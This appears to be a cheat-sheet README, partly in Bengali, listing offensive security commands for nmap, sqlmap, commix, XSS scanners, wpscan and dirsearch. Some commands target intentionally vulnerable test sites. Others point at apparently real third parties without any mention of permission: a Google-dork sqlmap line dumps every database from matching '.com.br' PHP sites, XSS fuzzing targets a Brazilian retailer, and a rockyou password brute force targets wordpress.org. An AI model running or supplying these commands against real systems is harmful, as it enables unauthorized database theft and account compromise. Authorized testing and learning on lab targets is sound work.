<h1 align="center">nmap</h1>

useful command

    nmap -sV -sC -F 10.10.32.221

    nmap -A -T5 -p- --script vuln 10.10.08.152
    
টার্গেট আইপির ক্ষেত্রে:

Single টার্গেট আইপি চেক: এখানে আইপি এর জায়গায় টার্গেট হোস্ট `scanme.nmap.org` দিতে পারবেন

    nmap 45.33.32.156

<br/>

একাধিক টার্গেট আইপি চেক: একাধিক আইপির ক্ষেত্রে প্রতিটা আইপি এর পরে একটি করে `space` দিতে হবে

    nmap 45.33.32.156 48.33.32.126 50.33.31.156

<br/>

নির্দিষ্ট রেঞ্জ `range` এর আইপি চেক: এখানে `১৫৬` থেকে `১৬০` পর্যন্ত মোট `৫` টি আইপি চেক করবে.

    nmap 45.33.32.156-160

<br/>

অনেক গুলো আইপি যদি  ফাইল আকারে save করা থাকে তাহলে ফাইলের ভোতরের আইপি গুলো চেক করার কমান্ড: সেক্ষে আইপি যুক্ত ফাইল এর লোকেশন টি সঠিক ভাবে দিতে হবে.

    nmap -iL /home/hunter/Desktop/multiple-ip.txt

<br/>

আইপি গুলো `file_name.txt` ফাইলের ভেতরে প্রতিটি লাইনে একেক টি করে থাকতে হবে.

```
45.33.32.157
45.33.32.158
45.33.32.159
45.33.32.160
```


<h1 align="center">sqlmap</h1>

parameter finding google dork

    site: .com.br inurl: .php?id=1
    
auto crawling command

    sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1 -o sqlcrawl.txt
    
auto dumping databases

    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt

finding vuln parameter using google dork

    sqlmap -g "site: .com.br inurl: .php?id=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt

Step by step dumping databases

    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch --threads 5 -o sqldumpfulldatabase.txt
    
Step by step dumping databases

    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads 5 -o sqldumpfulltable.txt
    
Step by step dumping databases

    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch --threads 5 -o sqlreadallcolumnsdata.txt
    
Step by step dumping databases

    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump --batch --threads 5 -o sqldumpfullcolumns.txt

Login page brute-forcing

    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms -o sqlbruteForcelogin.txt
    

    sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=abd&pass=abc&login=submit" --dbs

<h1 align="center">Sub Domain Enumeration</h1>

Sub Domain finding automation using assetfinder, httpx

    assetfinder -subs-only vulnweb.com | httpx -ip -random-agent -silent | tee /tmp/validsubDomains.txt

<h1 align="center">CMS Detector</h1>

auto Detecting

    cmseek -u https://wordpress.org --batch | tee 'path/cmsDetector.txt'

<h1 align="center">Gospider</h1>

Paramiter finding

    gospider -s "https://www.farmasilva.com.br" --no-redirect -o gospider.txt

<h1 align="center">XSStrike, xss finder</h1>

xss finding

    xsstrike -u "https://www.farmasilva.com.br/search?search_query=query" -f /usr/share/wordlists/SecLists/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt

<h1 align="center">XSpear, xss finder</h1>

xss finding

    XSpear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2 -o XSpear.txt

<h1 align="center">commix, xss finder</h1>

os command injection finding

    commix -u 'http://192.168.31.177/vulnerabilities/exec/#' --cookie="security=low; PHPSESSID=hcjrgadiie5f40vup73ehe0fu7; security=low" --data="ip=INJECT_HERE&Submit=Submit"

<h1 align="center">wpscan</h1>

Vulnerable plugin, themes, users

    wpscan --url https://wordpress.org -e vp,vt,u -o scanned.txt

Vulnerable plugins, All plugins, Vulnerable themes, All themes, Timthumbs, Config backups, Db exports, User, Media, Bypassing Simple WAFs

    wpscan --url https://wordpress.org -e vp,vt,tt,cb,dbe,u,m --random-user-agent -v -o scanned.txt

Password brute force attack

    wpscan --url https://wordpress.org -e u --passwords /usr/share/wordlists/rockyou.txt -o scanned.txt
    
finding flag from system

    find / -type f -name '*flag*.txt' 2>/dev/null

<h2 align="center">Usage of Dirsearch</h2>

Most used

    sudo dirsearch --full-url --extensions=php,html,js --exclude-extensions=xml,ico --include-status=200-399 --exclude-status=400 -r 3 --format plain -o dirsearchScan.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
    
Full URL & plain text output scan

    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -u http://testphp.vulnweb.com

Full url, plaintext output, custom wordlist

    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

Full url, plaintext output, wordlist, add extensions

    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

Full url, plaintext output, wordlist, add extensions & exclude extension

    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js -X xml -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

above all + status code

    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js -i 200,302 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

above all + Exclude Extensions

    sudo dirsearch --full-url --format plain -o dirsearchScan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

Full url, output plzintext, include extension, exclude extension, status code, recursive mode

    sudo dirsearch --full-url --format plain -o scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

Full url, output plzintext, include extension, exclude extension, status code, recursive mode+loop

    sudo dirsearch --full-url --format plain -o scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r --deep-recursive 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com

Full url, output plzintext, include extension, exclude extension, status code, recursive mode+loop, threads

    sudo dirsearch --full-url --format plain -o scan.txt -e php,html,js --exclude-extensions=xml,ico -i 200,301 -r --deep-recursive 3 -t 20 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://testphp.vulnweb.com
